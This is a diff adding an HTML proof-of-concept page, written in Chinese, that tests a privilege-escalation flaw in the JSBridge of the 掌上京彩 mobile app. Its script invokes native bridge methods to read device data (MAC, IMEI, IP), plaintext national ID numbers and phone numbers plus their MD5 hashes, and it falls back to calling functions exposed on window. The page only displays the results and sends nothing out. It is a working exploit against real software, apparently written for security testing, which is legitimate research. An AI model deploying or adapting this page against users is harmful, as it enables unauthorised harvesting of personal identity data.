@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>JSBridge 数据截获测试</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            padding: 15px; 
+            background: #f0f2f5; 
+            margin: 0;
+            color: #333;
+        }
+        h2 { text-align: center; font-size: 18px; margin-bottom: 20px; color: #1a1a1a; }
+        
+        .card {
+            background: #ffffff;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+        
+        .card-header {
+            font-size: 15px;
+            font-weight: bold;
+            color: #f03741;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        button { 
+            padding: 10px 15px; 
+            font-size: 14px; 
+            background-color: #f03741; 
+            color: white; 
+            border: none; 
+            border-radius: 6px; 
+            font-weight: bold;
+        }
+        button:active { background-color: #d02b34; transform: scale(0.98); }
+        
+        .result-box {
+            background: #fafafa;
+            border: 1px solid #e8e8e8;
+            border-radius: 6px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 14px;
+            color: #555;
+            min-height: 48px;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+        
+        .status-badge {
+            font-size: 12px;
+            padding: 2px 6px;
+            border-radius: 4px;
+            background: #ddd;
+            color: #666;
+        }
+        .status-badge.success { background: #e6f7ff; color: #1890ff; border: 1px solid #91d5ff; }
+        .status-badge.error { background: #fff2f0; color: #ff4d4f; border: 1px solid #ffccc7; }
+
+        .system-log {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #888;
+        }
+        #miniLog {
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 10px;
+            border-radius: 6px;
+            height: 120px;
+            overflow-y: scroll;
+        }
+    </style>
+</head>
+<body>
+    <h2>掌上京彩 Bridge 越权信息提取测试</h2>
+
+    <!-- 设备信息卡片 -->
+    <div class="card">
+        <div class="card-header">
+            <span>📡 设备与网络信息</span>
+            <button onclick="fetchData('thirdGetMobileInfo', 'res-mobile')">读取</button>
+        </div>
+        <div class="result-box" id="res-mobile">等待读取... (包含MAC, IMEI, IP等)</div>
+    </div>
+
+    <!-- 身份证卡片 -->
+    <div class="card">
+        <div class="card-header">
+            <span>🪪 身份证明文获取</span>
+            <button onclick="fetchData('thirdGetUserIdCardNum', 'res-idcard')">读取</button>
+        </div>
+        <div class="result-box" id="res-idcard">等待读取...</div>
+    </div>
+
+    <!-- 身份证MD5卡片 -->
+    <div class="card">
+        <div class="card-header">
+            <span>🔐 身份证MD5值</span>
+            <button onclick="fetchData('thirdGetUserIdCardMd5Num', 'res-idcard-md5')">读取</button>
+        </div>
+        <div class="result-box" id="res-idcard-md5">等待读取...</div>
+    </div>
+
+    <!-- 手机号卡片 -->
+    <div class="card">
+        <div class="card-header">
+            <span>📱 手机号明文获取</span>
+            <button onclick="fetchData('thirdGetUserPhotoNumber', 'res-phone')">读取</button>
+        </div>
+        <div class="result-box" id="res-phone">等待读取...</div>
+    </div>
+
+    <!-- 手机号MD5卡片 -->
+    <div class="card">
+        <div class="card-header">
+            <span>🔐 手机号MD5值</span>
+            <button onclick="fetchData('thirdGetUserPhotoMd5Number', 'res-phone-md5')">读取</button>
+        </div>
+        <div class="result-box" id="res-phone-md5">等待读取...</div>
+    </div>
+
+    <!-- 调试系统日志 -->
+    <div class="system-log">
+        <div style="margin-bottom: 5px;">终端执行日志日志：</div>
+        <div id="miniLog">环境检测加载中...<br></div>
+    </div>
+
+    <script>
+        function logMsg(msg, isError = false) {
+            const logDiv = document.getElementById('miniLog');
+            const color = isError ? '#ff4d4f' : '#00ff00';
+            logDiv.innerHTML += `<div style="color:${color};">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        // 核心 Bridge 调用函数，将结果直接渲染到对应 ID 的 DOM 元素中
+        function fetchData(apiName, renderElementId) {
+            const resBox = document.getElementById(renderElementId);
+            resBox.innerHTML = '<span style="color:#1890ff;">正在向原生系统请求拉取数据...</span>';
+            logMsg(`>>> 发起调用: ${apiName}`);
+            
+            // 兼容 TMF / X5 常见的 JSBridge 对象
+            const bridge = window.TMFJSBridge || window.JSBridge || window.WebViewJavascriptBridge;
+
+            if (bridge) {
+                try {
+                    bridge.invoke(apiName, {}, function(response) {
+                        try {
+                            // 尝试格式化 JSON 让页面上更容易看清层级
+                            const jsonStr = typeof response === 'object' ? JSON.stringify(response, null, 2) : response;
+                            resBox.innerHTML = `<span style="color:#d02b34;"><b>[获取成功]</b></span><br>${jsonStr}`;
+                            logMsg(`${apiName} 获取完成！`);
+                        } catch(err) {
+                            resBox.innerHTML = response; // 若不是对象则原样输出
+                        }
+                    });
+                } catch (e) {
+                    resBox.innerHTML = `<span style="color:#ff4d4f;">调用发生代码级异常: <br>${e.message}</span>`;
+                    logMsg(e.message, true);
+                }
+            } else {
+                // 如果环境变量没注入时的容错
+                if (window[apiName]) {
+                    try {
+                        let res = window[apiName]();
+                        const jsonStr = typeof res === 'object' ? JSON.stringify(res, null, 2) : res;
+                        resBox.innerHTML = `<span style="color:#ffaa00;"><b>[Window劫持获取成功]</b></span><br>${jsonStr}`;
+                    } catch(e) {
+                         resBox.innerHTML = `<span style="color:#ff4d4f;">尝试直接调用 ${apiName} 异常: ${e.message}</span>`;
+                    }
+                } else {
+                    resBox.innerHTML = '<span style="color:#ff4d4f;">JSBridge 桥接核心丢失！APP未向此网页注入权限，或拦截了接口。</span>';
+                    logMsg(`${apiName} 环境不支持或未授权`, true);
+                }
+            }
+        }
+
+        // 监听 TMF 原生壳子初始化完毕的回调
+        document.addEventListener('TMFJSBridgeReady', function() {
+            logMsg('✅ 系统安全容器 TMFJSBridgeReady 握手成功！');
+            // 可以选择在这里改变所有按钮为可点击状态
+        }, false);
+    </script>
+</body>
+</html>
